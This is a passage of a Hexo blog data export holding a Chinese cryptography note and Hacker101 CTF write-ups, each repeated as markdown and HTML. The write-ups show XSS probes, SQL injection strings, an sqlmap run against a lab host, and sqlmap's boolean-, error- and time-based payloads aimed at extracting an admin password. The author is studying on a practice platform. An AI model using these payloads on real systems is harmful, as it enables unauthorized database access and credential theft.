Chaining同样很常见。每一个明文block在加密前使用XOR与前一个密文进行运算。这样避免了ECB模式的缺陷。因为每一个block存在于一个类似于链式结构的情况，于是可能导致一些有趣的bug。</p>\n<ol start=\"2\">\n<li>Asymmetric – 使用private key</li>\n</ol>\n<p>对于非对称加密，最常见的就是RSA了，使用公钥和私钥。同时非对称加密也可以用于加密和签名。也有时候非对称加密没有直接用于加密是因为性能和复杂度的原因。</p>\n<h2 id=\"HASHES\"><a href=\"#HASHES\" class=\"headerlink\" title=\"HASHES\"></a>HASHES</h2><p>Hashes也组成了加密的重要部分，一个常见的hash方法 128-512 MD5 SHA1、SHA256。</p>\n<p>hash对于单独的object加密十分有帮助，决定了数据的integrity。</p>\n<h2 id=\"MACs\"><a href=\"#MACs\" class=\"headerlink\" title=\"MACs\"></a>MACs</h2><p>Message Authentication Codes通常基于hashes，这就意味着对于给定的MAC，你们可以确保数据没有被干扰，同时验证MAC能没有被篡改。这是因为，你需要共享同样的key用来验证MAC，如果没有就不能创建一个有效的MAC</p>\n<h2 id=\"HMAC\"><a href=\"#HMAC\" class=\"headerlink\" title=\"HMAC\"></a>HMAC</h2><p>最著名的MAC就是HMAC，使用一个简单的结构：<br>HMAC(key, message) = hash(key + hash(key + message))</p>\n<p>Key被各自的哈希算法填充，是十分最简单的一种了。</p>\n"},{"layout":"title","title":"Hacker101 CTF-1/2","date":"2018-12-12T15:11:06.000Z","_content":"I caught a nice website for learning basic information security recently. Hacker101. That site offers video course for novice to learn cryptography and information security from scratch. Also it has insteresting ctf question for us to solve. \n\nSo I gonna record my journey to the flag. Let's start from the simplest one. \n\n## CTF - 1 \n\nCTF - 1 Looks pretty simple, it gives a website and we can just inspect its source. Than we found it request a \"background.png\" as background. It seems weird when something called a resource from local directly. but we can check it our on the frontend.\n\nWe enter the `background.png` at the end of the address of website. Then we got the answer no surprisingly. \n\n## CTF - 2\n\nThis question shows us a mini CMS website. IT offers a simple management page to view and edit the page we created. And it use Markdown to help us formating the doc that we writed. \n\nWhen we are creating a page, we need edit two post form to fulfill the `POST` method to the server. There must be something hidden in it. Like what if we can write a scripts to inject some code on the front page to help us show the request information? \n\n### Flag 1\n\nWe input this code on the title bar. it ends the last tag and inject a scripts tag on the next line by `>`:\n```\n><scripts>alert(\"documents.cookies\")</scripts>\n```\nAlso we input `alert(\"documents.cookies\")` stright into the content form. \n\nThen we got our first flag. The hint shows us:\n\n+ Sometimes a given input will affect more than one page\n+ The bug you are looking for doesn't exist in the most obvious place this input is shown\n\n### Flag 2\n\nNow that we can control the page from the script code that we inject, maybe the source page could hide the flag like the CTF-1 shows. \n\nwe should add some tag, like img tag or button tag, into the contant form. \n\n```\n<img src='xxxxx'>\n```\n\nOpen the page, check the source page. The flag is right on here. Maybe we should know more about the XSS. \n\n### Flag 3\n\nThe flag 3 is actually a little bit tricky. I just don't know why it can cause a bug or some thing. To be honest, I have to check few more hint to get the flag. \n\nHere is the hint:\n+ Make sure you tamper with every input\n+ Have you tested for the usual culprits? XSS, SQL injection, path injection\n+ Bugs often occur when an input should always be one type and turns out to be another\n+ Remember, form submissions aren't the only inputs that come from browsers\n\nWe noticed that the address bar shows index to query the page form the server. May those index could exist inject. Like we can add a symbol on the end of address. e.g. `'`\n\nThan we got the flag, but that bug only exists in edit page. \n\n### Flag 4\n\nThe final bug also relate to the index, but this time we should focus how the website arrange the index for searching. When we create a new page, the index starts from 10, rather than 0. \n\nBut when we check the init page, test page and another stuff, we got the 0 and 1 index. So where are those page which index between 2 and 9? We input those index at the end of address page line. One by one, everytime we enter, we got the 404, until the 5th page. It shows `forbidden`. \n\nThat's weird. There must be something hidden in it. Why we just mock the trick used before, try create page or edit page. \n\nWe forcely enter the edit page with index 5. that the flag just lie down the content form. ","source":"_posts/[hack]-hacker101-1.md","raw":"---\nlayout: title\ntitle: Hacker101 CTF-1/2\ndate: 2018-12-12 09:11:06\ntags: hacker101\ncategories: Hack\n---\nI caught a nice website for learning basic information security recently. Hacker101. That site offers video course for novice to learn cryptography and information security from scratch. Also it has insteresting ctf question for us to solve. \n\nSo I gonna record my journey to the flag. Let's start from the simplest one. \n\n## CTF - 1 \n\nCTF - 1 Looks pretty simple, it gives a website and we can just inspect its source. Than we found it request a \"background.png\" as background. It seems weird when something called a resource from local directly. but we can check it our on the frontend.\n\nWe enter the `background.png` at the end of the address of website. Then we got the answer no surprisingly. \n\n## CTF - 2\n\nThis question shows us a mini CMS website. IT offers a simple management page to view and edit the page we created. And it use Markdown to help us formating the doc that we writed. \n\nWhen we are creating a page, we need edit two post form to fulfill the `POST` method to the server. There must be something hidden in it. Like what if we can write a scripts to inject some code on the front page to help us show the request information? \n\n### Flag 1\n\nWe input this code on the title bar. it ends the last tag and inject a scripts tag on the next line by `>`:\n```\n><scripts>alert(\"documents.cookies\")</scripts>\n```\nAlso we input `alert(\"documents.cookies\")` stright into the content form. \n\nThen we got our first flag. The hint shows us:\n\n+ Sometimes a given input will affect more than one page\n+ The bug you are looking for doesn't exist in the most obvious place this input is shown\n\n### Flag 2\n\nNow that we can control the page from the script code that we inject, maybe the source page could hide the flag like the CTF-1 shows. \n\nwe should add some tag, like img tag or button tag, into the contant form. \n\n```\n<img src='xxxxx'>\n```\n\nOpen the page, check the source page. The flag is right on here. Maybe we should know more about the XSS. \n\n### Flag 3\n\nThe flag 3 is actually a little bit tricky. I just don't know why it can cause a bug or some thing. To be honest, I have to check few more hint to get the flag. \n\nHere is the hint:\n+ Make sure you tamper with every input\n+ Have you tested for the usual culprits? XSS, SQL injection, path injection\n+ Bugs often occur when an input should always be one type and turns out to be another\n+ Remember, form submissions aren't the only inputs that come from browsers\n\nWe noticed that the address bar shows index to query the page form the server. May those index could exist inject. Like we can add a symbol on the end of address. e.g. `'`\n\nThan we got the flag, but that bug only exists in edit page. \n\n### Flag 4\n\nThe final bug also relate to the index, but this time we should focus how the website arrange the index for searching. When we create a new page, the index starts from 10, rather than 0. \n\nBut when we check the init page, test page and another stuff, we got the 0 and 1 index. So where are those page which index between 2 and 9? We input those index at the end of address page line. One by one, everytime we enter, we got the 404, until the 5th page. It shows `forbidden`. \n\nThat's weird. There must be something hidden in it. Why we just mock the trick used before, try create page or edit page. \n\nWe forcely enter the edit page with index 5. that the flag just lie down the content form. ","slug":"[hack]-hacker101-1","published":1,"updated":"2019-03-11T04:31:05.870Z","comments":1,"photos":[],"link":"","_id":"ckkljsash001gr242hn4ah3b2","content":"<p>I caught a nice website for learning basic information security recently. Hacker101. That site offers video course for novice to learn cryptography and information security from scratch. Also it has insteresting ctf question for us to solve. </p>\n<p>So I gonna record my journey to the flag. Let’s start from the simplest one. </p>\n<h2 id=\"CTF-1\"><a href=\"#CTF-1\" class=\"headerlink\" title=\"CTF - 1\"></a>CTF - 1</h2><p>CTF - 1 Looks pretty simple, it gives a website and we can just inspect its source. Than we found it request a “background.png” as background. It seems weird when something called a resource from local directly. but we can check it our on the frontend.</p>\n<p>We enter the <code>background.png</code> at the end of the address of website. Then we got the answer no surprisingly. </p>\n<h2 id=\"CTF-2\"><a href=\"#CTF-2\" class=\"headerlink\" title=\"CTF - 2\"></a>CTF - 2</h2><p>This question shows us a mini CMS website. IT offers a simple management page to view and edit the page we created. And it use Markdown to help us formating the doc that we writed. </p>\n<p>When we are creating a page, we need edit two post form to fulfill the <code>POST</code> method to the server. There must be something hidden in it. Like what if we can write a scripts to inject some code on the front page to help us show the request information? </p>\n<h3 id=\"Flag-1\"><a href=\"#Flag-1\" class=\"headerlink\" title=\"Flag 1\"></a>Flag 1</h3><p>We input this code on the title bar. it ends the last tag and inject a scripts tag on the next line by <code>&gt;</code>:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&lt;scripts&gt;alert(&quot;documents.cookies&quot;)&lt;/scripts&gt;</span><br></pre></td></tr></table></figure></p>\n<p>Also we input <code>alert(&quot;documents.cookies&quot;)</code> stright into the content form. </p>\n<p>Then we got our first flag. The hint shows us:</p>\n<ul>\n<li>Sometimes a given input will affect more than one page</li>\n<li>The bug you are looking for doesn’t exist in the most obvious place this input is shown</li>\n</ul>\n<h3 id=\"Flag-2\"><a href=\"#Flag-2\" class=\"headerlink\" title=\"Flag 2\"></a>Flag 2</h3><p>Now that we can control the page from the script code that we inject, maybe the source page could hide the flag like the CTF-1 shows. </p>\n<p>we should add some tag, like img tag or button tag, into the contant form. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&apos;xxxxx&apos;&gt;</span><br></pre></td></tr></table></figure>\n<p>Open the page, check the source page. The flag is right on here. Maybe we should know more about the XSS. </p>\n<h3 id=\"Flag-3\"><a href=\"#Flag-3\" class=\"headerlink\" title=\"Flag 3\"></a>Flag 3</h3><p>The flag 3 is actually a little bit tricky. I just don’t know why it can cause a bug or some thing. To be honest, I have to check few more hint to get the flag. </p>\n<p>Here is the hint:</p>\n<ul>\n<li>Make sure you tamper with every input</li>\n<li>Have you tested for the usual culprits? XSS, SQL injection, path injection</li>\n<li>Bugs often occur when an input should always be one type and turns out to be another</li>\n<li>Remember, form submissions aren’t the only inputs that come from browsers</li>\n</ul>\n<p>We noticed that the address bar shows index to query the page form the server. May those index could exist inject. Like we can add a symbol on the end of address. e.g. <code>&#39;</code></p>\n<p>Than we got the flag, but that bug only exists in edit page. </p>\n<h3 id=\"Flag-4\"><a href=\"#Flag-4\" class=\"headerlink\" title=\"Flag 4\"></a>Flag 4</h3><p>The final bug also relate to the index, but this time we should focus how the website arrange the index for searching. When we create a new page, the index starts from 10, rather than 0. </p>\n<p>But when we check the init page, test page and another stuff, we got the 0 and 1 index. So where are those page which index between 2 and 9? We input those index at the end of address page line. One by one, everytime we enter, we got the 404, until the 5th page. It shows <code>forbidden</code>. </p>\n<p>That’s weird. There must be something hidden in it. Why we just mock the trick used before, try create page or edit page. </p>\n<p>We forcely enter the edit page with index 5. that the flag just lie down the content form. </p>\n","site":{"data":{}},"excerpt":"","more":"<p>I caught a nice website for learning basic information security recently. Hacker101. That site offers video course for novice to learn cryptography and information security from scratch. Also it has insteresting ctf question for us to solve. </p>\n<p>So I gonna record my journey to the flag. Let’s start from the simplest one. </p>\n<h2 id=\"CTF-1\"><a href=\"#CTF-1\" class=\"headerlink\" title=\"CTF - 1\"></a>CTF - 1</h2><p>CTF - 1 Looks pretty simple, it gives a website and we can just inspect its source. Than we found it request a “background.png” as background. It seems weird when something called a resource from local directly. but we can check it our on the frontend.</p>\n<p>We enter the <code>background.png</code> at the end of the address of website. Then we got the answer no surprisingly. </p>\n<h2 id=\"CTF-2\"><a href=\"#CTF-2\" class=\"headerlink\" title=\"CTF - 2\"></a>CTF - 2</h2><p>This question shows us a mini CMS website. IT offers a simple management page to view and edit the page we created. And it use Markdown to help us formating the doc that we writed. </p>\n<p>When we are creating a page, we need edit two post form to fulfill the <code>POST</code> method to the server. There must be something hidden in it. Like what if we can write a scripts to inject some code on the front page to help us show the request information? </p>\n<h3 id=\"Flag-1\"><a href=\"#Flag-1\" class=\"headerlink\" title=\"Flag 1\"></a>Flag 1</h3><p>We input this code on the title bar. it ends the last tag and inject a scripts tag on the next line by <code>&gt;</code>:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&lt;scripts&gt;alert(&quot;documents.cookies&quot;)&lt;/scripts&gt;</span><br></pre></td></tr></table></figure></p>\n<p>Also we input <code>alert(&quot;documents.cookies&quot;)</code> stright into the content form. </p>\n<p>Then we got our first flag. The hint shows us:</p>\n<ul>\n<li>Sometimes a given input will affect more than one page</li>\n<li>The bug you are looking for doesn’t exist in the most obvious place this input is shown</li>\n</ul>\n<h3 id=\"Flag-2\"><a href=\"#Flag-2\" class=\"headerlink\" title=\"Flag 2\"></a>Flag 2</h3><p>Now that we can control the page from the script code that we inject, maybe the source page could hide the flag like the CTF-1 shows. </p>\n<p>we should add some tag, like img tag or button tag, into the contant form. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&apos;xxxxx&apos;&gt;</span><br></pre></td></tr></table></figure>\n<p>Open the page, check the source page. The flag is right on here. Maybe we should know more about the XSS. </p>\n<h3 id=\"Flag-3\"><a href=\"#Flag-3\" class=\"headerlink\" title=\"Flag 3\"></a>Flag 3</h3><p>The flag 3 is actually a little bit tricky. I just don’t know why it can cause a bug or some thing. To be honest, I have to check few more hint to get the flag. </p>\n<p>Here is the hint:</p>\n<ul>\n<li>Make sure you tamper with every input</li>\n<li>Have you tested for the usual culprits? XSS, SQL injection, path injection</li>\n<li>Bugs often occur when an input should always be one type and turns out to be another</li>\n<li>Remember, form submissions aren’t the only inputs that come from browsers</li>\n</ul>\n<p>We noticed that the address bar shows index to query the page form the server. May those index could exist inject. Like we can add a symbol on the end of address. e.g. <code>&#39;</code></p>\n<p>Than we got the flag, but that bug only exists in edit page. </p>\n<h3 id=\"Flag-4\"><a href=\"#Flag-4\" class=\"headerlink\" title=\"Flag 4\"></a>Flag 4</h3><p>The final bug also relate to the index, but this time we should focus how the website arrange the index for searching. When we create a new page, the index starts from 10, rather than 0. </p>\n<p>But when we check the init page, test page and another stuff, we got the 0 and 1 index. So where are those page which index between 2 and 9? We input those index at the end of address page line. One by one, everytime we enter, we got the 404, until the 5th page. It shows <code>forbidden</code>. </p>\n<p>That’s weird. There must be something hidden in it. Why we just mock the trick used before, try create page or edit page. </p>\n<p>We forcely enter the edit page with index 5. that the flag just lie down the content form. </p>\n"},{"layout":"title","title":"Hacker101 CTF-3","date":"2018-12-13T15:11:06.000Z","_content":"\n这一个CMS加入了需要登录的信息。在进行创建和编辑的时候需要用户名。首先就想到了一些无脑的用户名，admin之类的。试了一下，觉得不应该是这么简单。\n\n初步判断应该也是从SQL里面查取，所以尝试一下用`'`来注入。看看得到什么结果。\n\n```\nTraceback (most recent call last):\n  File \"./main.py\", line 145, in do_login\n    if cur.execute('SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')) == 0:\n  File \"/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py\", line 255, in execute\n    self.errorhandler(self, exc, value)\n  File \"/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py\", line 50, in defaulterrorhandler\n    raise errorvalue\nProgrammingError: (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1\")\n```\n\n意思是说我们在用MySQL数据库；使用的python2.7的main.py里面的do_login()查数据。查询命令就是`'SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')`\n\n这个后面的%%可能就是过滤一些东西的，之后再看看。\n\n我们用Sqlmap看看能不能够绕过这个表格POST。\n\n```\n python2.7 sqlmap.py -u http://35.196.135.216:5001/2f6fc5c078/login --data \"username=&password=\" --dbms mysql\n```\n\n然后得到的这个结果\n\n```\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\n    Payload: username=' OR NOT 1504=1504#&password=\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: username=' AND (SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(1816=1816,1))),0x71707a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TMjy&password=\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 OR time-based blind\n    Payload: username=' OR SLEEP(5)-- UXmq&password=\n```\n\n比如我们这个样注入一条`' or 1=1#`，第一个引号终止了原来的用户名，#表示注释掉后面的冒号，用来输入一个`1=1`的True的结果。但是得到的结果仍然是unknown user，这个时候在回头看python那个cur的函数，发现应该是这个函数来得到的布尔值，而不是里面的参数。\n\n这里引入一下[Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection) 来寻找有效的数据库的值。\n\n定一个查询函数使用`LIKE`，我们就可以匹配有效的密码。\n\n```\n'SELECT password FROM admins WHERE username=' ' or password LIKE \"%x\"#\n```\n`%`在这里表示字符的数量，包括0。x是一个从小写a-z和大写A-Z以及数字0里面的字符。查询x是否在里面。但是我们注意到%也是过滤器，被后面的replace函数过滤掉了。所以查询函数被清理成:\n\n```\n'SELECT password FROM admins WHERE username=' ' or password LIKE \"%%x\"#\n```\n\n目前卡在这里了，后续更新。","source":"_posts/[hack]-hacker101-2.md","raw":"---\nlayout: title\ntitle: Hacker101 CTF-3\ndate: 2018-12-13 09:11:06\ntags: hacker101\ncategories: Hack\n---\n\n这一个CMS加入了需要登录的信息。在进行创建和编辑的时候需要用户名。首先就想到了一些无脑的用户名，admin之类的。试了一下，觉得不应该是这么简单。\n\n初步判断应该也是从SQL里面查取，所以尝试一下用`'`来注入。看看得到什么结果。\n\n```\nTraceback (most recent call last):\n  File \"./main.py\", line 145, in do_login\n    if cur.execute('SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')) == 0:\n  File \"/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py\", line 255, in execute\n    self.errorhandler(self, exc, value)\n  File \"/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py\", line 50, in defaulterrorhandler\n    raise errorvalue\nProgrammingError: (1064, \"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1\")\n```\n\n意思是说我们在用MySQL数据库；使用的python2.7的main.py里面的do_login()查数据。查询命令就是`'SELECT password FROM admins WHERE username=\\'%s\\'' % request.form['username'].replace('%', '%%')`\n\n这个后面的%%可能就是过滤一些东西的，之后再看看。\n\n我们用Sqlmap看看能不能够绕过这个表格POST。\n\n```\n python2.7 sqlmap.py -u http://35.196.135.216:5001/2f6fc5c078/login --data \"username=&password=\" --dbms mysql\n```\n\n然后得到的这个结果\n\n```\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\n    Payload: username=' OR NOT 1504=1504#&password=\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: username=' AND (SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(1816=1816,1))),0x71707a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TMjy&password=\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 OR time-based blind\n    Payload: username=' OR SLEEP(5)-- UXmq&password=\n```\n\n比如我们这个样注入一条`' or 1=1#`，第一个引号终止了原来的用户名，#表示注释掉后面的冒号，用来输入一个`1=1`的True的结果。但是得到的结果仍然是unknown user，这个时候在回头看python那个cur的函数，发现应该是这个函数来得到的布尔值，而不是里面的参数。\n\n这里引入一下[Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection) 来寻找有效的数据库的值。\n\n定一个查询函数使用`LIKE`，我们就可以匹配有效的密码。\n\n```\n'SELECT password FROM admins WHERE username=' ' or password LIKE \"%x\"#\n```\n`%`在这里表示字符的数量，包括0。x是一个从小写a-z和大写A-Z以及数字0里面的字符。查询x是否在里面。但是我们注意到%也是过滤器，被后面的replace函数过滤掉了。所以查询函数被清理成:\n\n```\n'SELECT password FROM admins WHERE username=' ' or password LIKE \"%%x\"#\n```\n\n目前卡在这里了，后续更新。","slug":"[hack]-hacker101-2","published":1,"updated":"2019-03-13T08:30:11.288Z","comments":1,"photos":[],"link":"","_id":"ckkljsasi001ir2424g2oylwo","content":"<p>这一个CMS加入了需要登录的信息。在进行创建和编辑的时候需要用户名。首先就想到了一些无脑的用户名，admin之类的。试了一下，觉得不应该是这么简单。</p>\n<p>初步判断应该也是从SQL里面查取，所以尝试一下用<code>&#39;</code>来注入。看看得到什么结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File &quot;./main.py&quot;, line 145, in do_login</span><br><span class=\"line\">    if cur.execute(&apos;SELECT password FROM admins WHERE username=\\&apos;%s\\&apos;&apos; % request.form[&apos;username&apos;].replace(&apos;%&apos;, &apos;%%&apos;)) == 0:</span><br><span class=\"line\">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py&quot;, line 255, in execute</span><br><span class=\"line\">    self.errorhandler(self, exc, value)</span><br><span class=\"line\">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py&quot;, line 50, in defaulterrorhandler</span><br><span class=\"line\">    raise errorvalue</span><br><span class=\"line\">ProgrammingError: (1064, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;&apos;&apos;&apos; at line 1&quot;)</span><br></pre></td></tr></table></figure>\n<p>意思是说我们在用MySQL数据库；使用的python2.7的main.py里面的do_login()查数据。查询命令就是<code>&#39;SELECT password FROM admins WHERE username=\\&#39;%s\\&#39;&#39; % request.form[&#39;username&#39;].replace(&#39;%&#39;, &#39;%%&#39;)</code></p>\n<p>这个后面的%%可能就是过滤一些东西的，之后再看看。</p>\n<p>我们用Sqlmap看看能不能够绕过这个表格POST。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2.7 sqlmap.py -u http://35.196.135.216:5001/2f6fc5c078/login --data &quot;username=&amp;password=&quot; --dbms mysql</span><br></pre></td></tr></table></figure>\n<p>然后得到的这个结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Parameter: username (POST)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class=\"line\">    Payload: username=&apos; OR NOT 1504=1504#&amp;password=</span><br><span class=\"line\">    Type: error-based</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class=\"line\">    Payload: username=&apos; AND (SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(1816=1816,1))),0x71707a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TMjy&amp;password=</span><br><span class=\"line\">    Type: AND/OR time-based blind</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class=\"line\">    Payload: username=&apos; OR SLEEP(5)-- UXmq&amp;password=</span><br></pre></td></tr></table></figure>\n<p>比如我们这个样注入一条<code>&#39; or 1=1#</code>，第一个引号终止了原来的用户名，#表示注释掉后面的冒号，用来输入一个<code>1=1</code>的True的结果。但是得到的结果仍然是unknown user，这个时候在回头看python那个cur的函数，发现应该是这个函数来得到的布尔值，而不是里面的参数。</p>\n<p>这里引入一下<a href=\"https://www.owasp.org/index.php/Blind_SQL_Injection\" target=\"_blank\" rel=\"external\">Blind SQL Injection</a> 来寻找有效的数据库的值。</p>\n<p>定一个查询函数使用<code>LIKE</code>，我们就可以匹配有效的密码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;SELECT password FROM admins WHERE username=&apos; &apos; or password LIKE &quot;%x&quot;#</span><br></pre></td></tr></table></figure>\n<p><code>%</code>在这里表示字符的数量，包括0。x是一个从小写a-z和大写A-Z以及数字0里面的字符。查询x是否在里面。但是我们注意到%也是过滤器，被后面的replace函数过滤掉了。所以查询函数被清理成:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;SELECT password FROM admins WHERE username=&apos; &apos; or password LIKE &quot;%%x&quot;#</span><br></pre></td></tr></table></figure>\n<p>目前卡在这里了，后续更新。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>这一个CMS加入了需要登录的信息。在进行创建和编辑的时候需要用户名。首先就想到了一些无脑的用户名，admin之类的。试了一下，觉得不应该是这么简单。</p>\n<p>初步判断应该也是从SQL里面查取，所以尝试一下用<code>&#39;</code>来注入。看看得到什么结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File &quot;./main.py&quot;, line 145, in do_login</span><br><span class=\"line\">    if cur.execute(&apos;SELECT password FROM admins WHERE username=\\&apos;%s\\&apos;&apos; % request.form[&apos;username&apos;].replace(&apos;%&apos;, &apos;%%&apos;)) == 0:</span><br><span class=\"line\">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py&quot;, line 255, in execute</span><br><span class=\"line\">    self.errorhandler(self, exc, value)</span><br><span class=\"line\">  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py&quot;, line 50, in defaulterrorhandler</span><br><span class=\"line\">    raise errorvalue</span><br><span class=\"line\">ProgrammingError: (1064, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;&apos;&apos;&apos; at line 1&quot;)</span><br></pre></td></tr></table></figure>\n<p>意思是说我们在用MySQL数据库；使用的python2.7的main.py里面的do_login()查数据。查询命令就是<code>&#39;SELECT password FROM admins WHERE username=\\&#39;%s\\&#39;&#39; % request.form[&#39;username&#39;].replace(&#39;%&#39;, &#39;%%&#39;)</code></p>\n<p>这个后面的%%可能就是过滤一些东西的，之后再看看。</p>\n<p>我们用Sqlmap看看能不能够绕过这个表格POST。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2.7 sqlmap.py -u http://35.196.135.216:5001/2f6fc5c078/login --data &quot;username=&amp;password=&quot; --dbms mysql</span><br></pre></td></tr></table></figure>\n<p>然后得到的这个结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Parameter: username (POST)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class=\"line\">    Payload: username=&apos; OR NOT 1504=1504#&amp;password=</span><br><span class=\"line\">    Type: error-based</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class=\"line\">    Payload: username=&apos; AND (SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(1816=1816,1))),0x71707a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TMjy&amp;password=</span><br><span class=\"line\">    Type: AND/OR time-based blind</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0.12 OR time-based blind</span><br><span class=\"line\">    Payload: username=&apos; OR SLEEP(5)-- UXmq&amp;password=</span><br></pre></td></tr></table></figure>\n<p>比如我们这个样注入一条<code>&#39; or 1=1#</code>，第一个引号终止了原来的用户名，#表示注释掉后面的冒号，用来输入一个<code>1=1</code>的True的结果。但是得到的结果仍然是unknown user，这个时候在回头看python那个cur的函数，发现应该是这个函数来得到的布尔值，而不是里面的参数。</p>\n<p>这里引入一下<a href=\"https://www.owasp.org/index.php/Blind_SQL_Injection\">Blind SQL Injection</a> 来寻找有效的数据库的值。</p>\n<p>定一个查询函数使用<code>LIKE</code>，我们就可以匹配有效的密码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;SELECT password FROM admins WHERE username=&apos; &apos; or password LIKE &quot;%x&quot;#</span><br></pre></td></tr></table></figure>\n<p><code>%</code>在这里表示字符的数量，包括0。x是一个从小写a-z和大写A-Z以及数字0里面的字符。查询x是否在里面。但是我们注意到%也是过滤器，被后面的replace函数过滤掉了。所以查询函数被清理成:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;SELECT password FROM 